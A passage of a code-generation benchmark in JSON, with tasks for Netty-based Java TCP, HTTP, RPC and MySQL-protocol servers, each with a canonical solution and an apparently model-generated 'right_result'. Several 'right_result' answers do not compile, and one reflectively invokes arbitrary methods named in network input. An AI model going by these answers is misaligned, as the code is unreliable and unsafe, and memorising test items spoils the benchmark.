finally {\n            log.error(\"shutdown bossGroup and workerGroup\");\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            serviceHandlerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.publishService(rpcServiceConfig);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import org.springframework.stereotype.Component;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyRpcServer {\n\n    private int PORT = 9998;\n    private ServiceProvider serviceProvider;\n\n    public NettyRpcServer(ServiceProvider serviceProvider) {\n        this.serviceProvider = serviceProvider;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(\n                                    new LengthFieldBasedFrameDecoder(8192, 0, 4, 0, 4),\n                                    new StringDecoder(),\n                                    new StringEncoder(),\n                                    new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS),\n                                    new RpcRequestHandler(serviceProvider)\n                            );\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.register(rpcServiceConfig);\n    }\n\n    private static class RpcRequestHandler extends SimpleChannelInboundHandler<String> {\n        private final ServiceProvider serviceProvider;\n\n        public RpcRequestHandler(ServiceProvider serviceProvider) {\n            this.serviceProvider = serviceProvider;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n            RpcRequest rpcRequest = parseRequest(msg);\n            Object service = serviceProvider.getService(rpcRequest.getServiceName());\n            Object result = service.getClass().getMethod(rpcRequest.getMethodName(), rpcRequest.getParameterTypes()).invoke(service, rpcRequest.getParameters());\n            ctx.writeAndFlush(result.toString());\n        }\n\n        private RpcRequest parseRequest(String msg) {\n            return new RpcRequest(msg);\n        }\n    }\n}"
  },
  {
    "Task_id": 163,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that can handle incoming client connections, support SSL/TLS encryption, and provide graceful shutdown capabilities.\n\nClass Description: The NettyServer class is responsible for creating and managing a TCP server using Netty framework. It handles server initialization, SSL configuration (if enabled), thread pool management, and proper resource cleanup during shutdown.\n\nAttributes:\n- blade: [Blade] - Reference to the Blade framework instance for web application context\n- environment: [Environment] - Configuration environment containing server settings\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- channel: [Channel] - Netty channel representing the server socket\n- DEFAULT_ACCEPT_THREAD_COUNT: [int] - Default number of threads for accepting connections\n- DEFAULT_IO_THREAD_COUNT: [int] - Default number of threads for I/O operations\n\nMethods:\n- startServer(): [void] -> [void] - Starts the Netty server with configured settings, including optional SSL/TLS setup. Reads configuration from environment and initializes thread pools.\n- stop(): [void] -> [void] - Gracefully shuts down the server by releasing all thread pool resources and closing the server channel.",
    "Canonical_solution": "import com.hellokaton.blade.Blade;\nimport com.hellokaton.blade.Environment;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoop;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport lombok.extern.slf4j.Slf4j;\n\nimport static com.hellokaton.blade.kit.BladeKit.getStartedSymbol;\nimport static com.hellokaton.blade.mvc.BladeConst.*;\n\n@Slf4j\npublic class NettyServer {\n\n    private Blade blade;\n    private Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = 0;\n\n    public void startServer() throws Exception {\n        boolean SSL = environment.getBoolean(ENV_KEY_SSL, false);\n        SslContext sslCtx = null;\n        if (SSL) {\n            String certFilePath = environment.get(ENV_KEY_SSL_CERT, null);\n            String privateKeyPath = environment.get(ENV_KEY_SSL_PRIVATE_KEY, null);\n            String privateKeyPassword = environment.get(ENV_KEY_SSL_PRIVATE_KEY_PASS, null);\n            \n            log.info(\"{}SSL CertChainFile  Path: {}\", getStartedSymbol(), certFilePath);\n            log.info(\"{}SSL PrivateKeyFile Path: {}\", getStartedSymbol(), privateKeyPath);\n            sslCtx = SslContextBuilder.forServer(new File(certFilePath), new File(privateKeyPath), privateKeyPassword).build();\n        }\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n\n        int acceptThreadCount = environment.getInt(ENV_KEY_NETTY_ACCEPT_THREAD_COUNT, DEFAULT_ACCEPT_THREAD_COUNT);\n        int ioThreadCount = environment.getInt(ENV_KEY_NETTY_IO_THREAD_COUNT, DEFAULT_IO_THREAD_COUNT);\n\n        this.bossGroup = new NioEventLoopGroup(acceptThreadCount, new NamedThreadFactory(\"boss@\"));\n        this.workerGroup = new NioEventLoopGroup(ioThreadCount, new NamedThreadFactory(\"worker@\"));\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.TCP_NODELAY, environment.getBoolean(ENV_KEY_NETTY_TCP_NODELAY, true))\n                .childOption(ChannelOption.SO_KEEPALIVE, environment.getBoolean(ENV_KEY_NETTY_SO_KEEPALIVE, true))\n                .childHandler(new HttpServerInitializer(sslCtx, blade));\n\n        String address = environment.get(ENV_KEY_SERVER_ADDRESS, DEFAULT_SERVER_ADDRESS);\n        Integer port = environment.getInt(ENV_KEY_SERVER_PORT, DEFAULT_SERVER_PORT);\n\n        channel = bootstrap.bind(address, port).sync().channel();\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.SslProvider;\n\npublic class NettyServer {\n    private final Blade blade;\n    private final Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = 1;\n\n    public NettyServer(Blade blade, Environment environment) {\n        this.blade = blade;\n        this.environment = environment;\n    }\n\n    public void startServer() {\n        int port = environment.getPort();\n        int acceptThreadCount = environment.getAcceptThreadCount();\n        int ioThreadCount = environment.getIoThreadCount();\n\n        if (acceptThreadCount <= 0) acceptThreadCount = DEFAULT_ACCEPT_THREAD_COUNT;\n        if (ioThreadCount <= 0) ioThreadCount = DEFAULT_IO_THREAD_COUNT;\n\n        bossGroup = new NioEventLoopGroup(acceptThreadCount);\n        workerGroup = new NioEventLoopGroup(ioThreadCount);\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (environment.isSslEnabled()) {\n                            try {\n                                SslContext sslCtx = SslContextBuilder.forServer(\n                                        new java.io.File(environment.getKeyStorePath()),\n                                        new java.io.File(environment.getTrustStorePath())\n                                ).build();\n                                pipeline.addLast(sslCtx.newHandler(ch.alloc()));\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        pipeline.addLast(new MyHandler());\n                    }\n                })\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            channel = bootstrap.bind(port).sync().channel();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 165,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable thread pool, and managing server lifecycle.\n\nClass Description: NettyServer is a TCP server implementation that uses Netty framework for non-blocking I/O operations. It manages server connections, processes incoming requests through a thread pool, and provides lifecycle control (open/close) for the server.\n\nAttributes:\n- channelManage: [NettyServerChannelManage] - Manages active server channels and connections\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- serverChannel: [Channel] - The main server channel listening for connections\n- messageHandler: [MessageHandler] - Handler for processing incoming messages\n- threadPoolExecutor: [ThreadPoolExecutor] - Thread pool for request processing\n- rejectCounter: [AtomicInteger] - Counter for rejected requests\n- logger: [Logger] - Logger instance for server operations\n- url: [URL] - Configuration URL containing server parameters\n- state: [ChannelState] - Current state of the server channel\n- codec: [Codec] - Codec for message serialization/deserialization\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools and Netty components, binds to configured port\n- close([int] timeout) -> [void] - Shuts down the server gracefully, releasing all resources\n- cleanup() -> [void] - Internal method for resource cleanup during server shutdown\n- NettyServer([URL] url, [MessageHandler] messageHandler) - Constructor initializing server with configuration and message handler",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.hongxi.summer.common.ChannelState;\nimport org.hongxi.summer.common.SummerConstants;\nimport org.hongxi.summer.common.URLParamType;\nimport org.hongxi.summer.common.threadpool.DefaultThreadFactory;\nimport org.hongxi.summer.common.threadpool.StandardThreadPoolExecutor;\nimport org.hongxi.summer.exception.SummerFrameworkException;\nimport org.hongxi.summer.rpc.Request;\nimport org.hongxi.summer.rpc.Response;\nimport org.hongxi.summer.rpc.URL;\nimport org.hongxi.summer.transport.AbstractServer;\nimport org.hongxi.summer.transport.MessageHandler;\nimport org.hongxi.summer.transport.TransportException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);\n\n    protected NettyServerChannelManage channelManage;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private ThreadPoolExecutor threadPoolExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            logger.warn(\"server channel already open, url={}\", url);\n            return state.isAliveState();\n        }\n\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        logger.info(\"server channel start open, url={}\", url);\n        boolean shareChannel = url.getBooleanParameter(\n                URLParamType.shareChannel.getName(), URLParamType.shareChannel.boolValue());\n        int maxContentLength = url.getIntParameter(\n                URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.intValue());\n        int maxServerConnections = url.getIntParameter(\n                URLParamType.maxServerConnections.getName(), URLParamType.maxServerConnections.intValue());\n        int maxQueueSize = url.getIntParameter(\n                URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.intValue());\n\n        int minWorkerThreads;\n        int maxWorkerThreads;\n        if (shareChannel) {\n            minWorkerThreads = url.getIntParameter(URLParamType.minWorkerThreads.getName(),\n                    SummerConstants.NETTY_SHARE_CHANNEL_MIN_WORKER_THREADS);\n            maxWorkerThreads = url.getIntParameter(URLParamType.maxWorkerThreads.getName(),\n                    SummerConstants.NETTY_SHARE_CHANNEL_MAX_WORKER_THREADS);\n        } else {\n            minWorkerThreads = url.getIntParameter(URLParamType.minWorkerThreads.getName(),\n                    SummerConstants.NETTY_NOT_SHARE_CHANNEL_MIN_WORKER_THREADS);\n            maxWorkerThreads = url.getIntParameter(URLParamType.maxWorkerThreads.getName(),\n                    SummerConstants.NETTY_NOT_SHARE_CHANNEL_MAX_WORKER_THREADS);\n        }\n\n        if (threadPoolExecutor == null || threadPoolExecutor.isShutdown()) {\n            threadPoolExecutor = new StandardThreadPoolExecutor(minWorkerThreads, maxWorkerThreads,\n                    maxQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        }\n        threadPoolExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnections);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        ChannelPipeline pipeline = socketChannel.pipeline();\n                        pipeline.addLast(\"channel_manage\", channelManage);\n                        pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                        pipeline.addLast(\"encoder\", new NettyEncoder());\n                        pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, threadPoolExecutor));\n                    }\n                });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        state = ChannelState.ALIVE;\n        logger.info(\"server channel finished open: url={}\", url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) return;\n\n        try {\n            cleanup();\n            if (state.isUnInitState()) {\n                logger.info(\"Server close failed, state={}, uri={}\", state.value(), url.getUri());\n                return;\n            }\n\n            state = ChannelState.CLOSE;\n            logger.info(\"Server close success, uri={}\", url.getUri());\n        } catch (Exception e) {\n            logger.error(\"Server close error, uri={}\", url.getUri(), e);\n        }\n    }\n\n    private void cleanup() {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n            bossGroup = null;\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        if (channelManage != null) {\n            channelManage.close();\n        }\n        if (threadPoolExecutor != null) {\n            threadPoolExecutor.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.Codec;\nimport java.net.URL;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyServer {\n    private final ChannelManage channelManage;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private final MessageHandler messageHandler;\n    private final ThreadPoolExecutor threadPoolExecutor;\n    private final AtomicInteger rejectCounter;\n    private final Logger logger;\n    private final URL url;\n    private final ChannelState state;\n    private final Codec codec;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        this.url = url;\n        this.messageHandler = messageHandler;\n        this.channelManage = new ChannelManage();\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.serverChannel = null;\n        this.threadPoolExecutor = new ThreadPoolExecutor(5, 20, 60L, java.util.concurrent.TimeUnit.SECONDS, new java.util.concurrent.LinkedBlockingQueue<>());\n        this.rejectCounter = new AtomicInteger(0);\n        this.logger = LoggerFactory.getLogger(NettyServer.class);\n        this.state = ChannelState.OPEN;\n        this.codec = new Codec();\n    }\n\n    public boolean open() {\n        int port = Integer.parseInt(url.getParameter(\"port\"));\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<Channel>() {\n                 @Override\n                 protected void initChannel(Channel ch) throws Exception {\n                     ch.pipeline().addLast(codec);\n                     ch.pipeline().addLast(messageHandler);\n                 }\n             })\n             .option(ChannelOption.SO_REUSEADDR, true)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            serverChannel = b.bind(port).sync().channel();\n            state = ChannelState.OPEN;\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to start server\", e);\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (serverChannel != null) {\n            serverChannel.closeFuture().await(timeout);\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        cleanup();\n    }\n\n    private void cleanup() {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public void rejectRequest() {\n        rejectCounter.incrementAndGet();\n    }\n}\n```"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP server for handling RPC (Remote Procedure Call) requests. The server should manage incoming connections, process HTTP requests, and handle server lifecycle events (start/stop).\n\nClass Description: NettyHttpServer is a server implementation that uses Netty framework to create a non-blocking HTTP server capable of handling RPC requests. It manages thread pools for request processing and implements proper resource cleanup during shutdown.\n\nAttributes:\n- thread: Thread - The thread in which the Netty server runs\n- logger: Logger - Logger instance for server events (inherited from parent class)\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty HTTP server on a specified port, initializes thread pools, and sets up request handlers\n  - Input: xxlRpcProviderFactory - Configuration factory containing server parameters like port number and thread pool sizes\n  - Output: None (server runs asynchronously in a separate thread)\n  \n- stop() -> void - Stops the server gracefully by interrupting the server thread and shutting down all resources\n  - Input: None\n  - Output: None (performs cleanup operations)\n\nThe implementation should follow Netty best practices including:\n1. Using separate event loop groups for connection acceptance and request processing\n2. Proper channel pipeline configuration with HTTP codecs and aggregator\n3. Idle connection handling\n4. Graceful shutdown of all resources\n5. Thread pool management for request processing\n6. Proper error handling and logging",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.Server;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) {\n        thread = new Thread(() -> {\n            final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                    NettyHttpServer.class.getSimpleName(),\n                    xxlRpcProviderFactory.getCorePoolSize(),\n                    xxlRpcProviderFactory.getMaxPoolSize());\n            EventLoopGroup bossGroup = new NioEventLoopGroup();\n            EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n            try {\n                ServerBootstrap bootstrap = new ServerBootstrap();\n                bootstrap.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            public void initChannel(SocketChannel channel) {\n                                channel.pipeline()\n                                        .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL * 3, TimeUnit.SECONDS))\n                                        .addLast(new HttpServerCodec())\n                                        .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                        .addLast(new NettyHttpServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                            }\n                        })\n                        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                logger.info(\">>>>>>>>>>> xxl-rpc remoting server start success, nettype = {}, port = {}\", NettyHttpServer.class.getName(), xxlRpcProviderFactory.getPort());\n                onStarted();\n\n                future.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                if (e instanceof InterruptedException) {\n                    logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                } else {\n                    logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                }\n            } finally {\n                try {\n                    serverHandlerPool.shutdown();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n                try {\n                    workerGroup.shutdownGracefully();\n                    bossGroup.shutdownGracefully();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.apache.logging.log4j.Logger;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpServer {\n    private final Thread thread;\n    private final Logger logger;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n    private ThreadPoolExecutor requestExecutor;\n\n    public NettyHttpServer(Logger logger) {\n        this.logger = logger;\n        this.thread = new Thread(this::startServer);\n    }\n\n    public void start(XxlRpcProviderFactory factory) {\n        int port = factory.getPort();\n        int corePoolSize = factory.getCorePoolSize();\n        int maxPoolSize = factory.getMaxPoolSize();\n\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup(corePoolSize, maxPoolSize);\n\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childHandler(new ChannelInitializer<>() {\n                    @Override\n                    protected void initChannel(io.netty.channel.Channel ch) {\n                        ch.pipeline().addLast(new HttpServerCodec());\n                        ch.pipeline().addLast(new HttpObjectAggregator(1024 * 1024));\n                        ch.pipeline().addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                        ch.pipeline().addLast(new io.netty.handler.codec.http.HttpRequestHandler());\n                    }\n                });\n\n        requestExecutor = new ThreadPoolExecutor(corePoolSize, maxPoolSize, 60, TimeUnit.SECONDS, new java.util.concurrent.LinkedBlockingQueue<>());\n\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            logger.error(\"Server shutdown interrupted\", e);\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            requestExecutor.shutdownNow();\n        }\n    }\n\n    public void stop() {\n        thread.interrupt();\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        requestExecutor.shutdownNow();\n    }\n\n    private void startServer() {\n        try {\n            start(null);\n        } catch (Exception e) {\n            logger.error(\"Server start failed\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 168,
    "Instruction": "Task Description: Create a Java class that implements a MySQL-compatible Netty TCP server to handle client connections and MySQL protocol communication.\n\nClass Description: The MysqlNettyServer class is a Netty-based TCP server that handles MySQL protocol connections. It manages client connections, processes MySQL protocol messages, and maintains connection state. The server uses Netty's non-blocking I/O model for high performance.\n\nAttributes:\n- host: String - The host address the server binds to (nullable)\n- port: int - The port number the server listens on\n- connections: static Map<String, MysqlConnection> - Thread-safe map storing active MySQL connections by connection ID\n- eventLoopGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- server: ServerBootstrap - Netty server bootstrap instance for server configuration\n\nMethods:\n- start() -> void - Starts the Netty server, binds to the specified host and port, and begins accepting connections. Throws Exception if binding fails.\n- channelInitializer() -> ChannelInitializer<SocketChannel> - Creates and returns a channel initializer that sets up the pipeline for new connections, including handlers for MySQL protocol processing.\n- close() -> void - Shuts down the server gracefully by closing all connections and releasing resources.\n\nThe class uses Netty's NIO transport and includes handlers for:\n1. MySQL handshake protocol\n2. MySQL message decoding\n3. Connection idle state management\n4. MySQL command processing\n5. Exception handling\n\nThe server maintains thread-safe tracking of active connections and automatically cleans up closed connections.",
    "Canonical_solution": "import io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.dingodb.driver.mysql.MysqlConnection;\nimport io.dingodb.net.netty.NettyHandlers;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioChannelOption;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.StandardSocketOptions;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Slf4j\n@Getter\n@Builder\npublic class MysqlNettyServer {\n    public final String host;\n    public final int port;\n    public static final Map<String, MysqlConnection> connections = new ConcurrentHashMap<>();\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(151,\n            new ThreadPoolBuilder().name(\"mysql server \" + port).coreThreads(151).maximumThreads(151).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childOption(ChannelOption.SO_KEEPALIVE, Boolean.TRUE)\n            .childOption(NioChannelOption.of(StandardSocketOptions.SO_KEEPALIVE), Boolean.TRUE)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                MysqlConnection mysqlConnection = new MysqlConnection(ch);\n                ch.closeFuture().addListener(f -> {\n                    if (mysqlConnection.getId() != null) {\n                        connections.remove(mysqlConnection.getId());\n                    }\n                }).addListener(f -> mysqlConnection.close());\n                ch.pipeline().addLast(\"handshake\", new HandshakeHandler(mysqlConnection));\n                ch.pipeline().addLast(\"decoder\", new MysqlDecoder());\n                MysqlIdleStateHandler mysqlIdleStateHandler = new MysqlIdleStateHandler(\n                    28800, 60);\n                mysqlConnection.mysqlIdleStateHandler = mysqlIdleStateHandler;\n                ch.pipeline().addLast(\"idleStateHandler\", mysqlIdleStateHandler);\n                ch.pipeline()\n                    